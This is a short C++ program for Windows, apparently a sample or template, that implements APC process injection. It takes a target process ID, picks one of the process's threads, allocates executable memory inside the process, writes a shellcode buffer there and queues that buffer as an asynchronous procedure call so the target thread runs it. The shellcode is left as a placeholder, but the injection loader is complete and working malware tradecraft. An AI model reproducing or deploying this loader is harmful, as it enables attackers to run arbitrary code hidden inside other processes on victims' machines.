#include <Windows.h>
#include <tlhelp32.h>

int main(int argc, char* argv[])
{
    unsigned char shellcode[] = "...";

    // convert the provided argument to an integer
    auto pid = atoi(argv[1]);

    DWORD threadId = 0;

    // create thread snapshot
    auto hSnapshot = CreateToolhelp32Snapshot(
        TH32CS_SNAPTHREAD,
        0
    );

    THREADENTRY32 te = { 0 };
    te.dwSize = sizeof(te);

    // walk the threads
    Thread32First(hSnapshot, &te);

    do {
        if (te.dwSize >= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) + sizeof(te.th32OwnerProcessID)) {
            if (te.th32OwnerProcessID == pid) {
                // use the first thread we find
                threadId = te.th32ThreadID;
                break;
            }
        }
        te.dwSize = sizeof(te);
    } while (Thread32Next(hSnapshot, &te));

    if (threadId == 0) {
        // we failed to find a thread
        return 0;
    }

    // get a handle to the process
    auto hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        pid
    );

    // allocate a region of memory
    auto hMemory = VirtualAllocEx(
        hProcess,
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        hProcess,
        hMemory,
        &shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // open handle to target thread
    auto hThread = OpenThread(
        THREAD_ALL_ACCESS,
        FALSE,
        threadId
    );

  	// queue the apc
    QueueUserAPC(
        (PAPCFUNC)hMemory,  // target function
        hThread,            // target thread
        0
    );
}
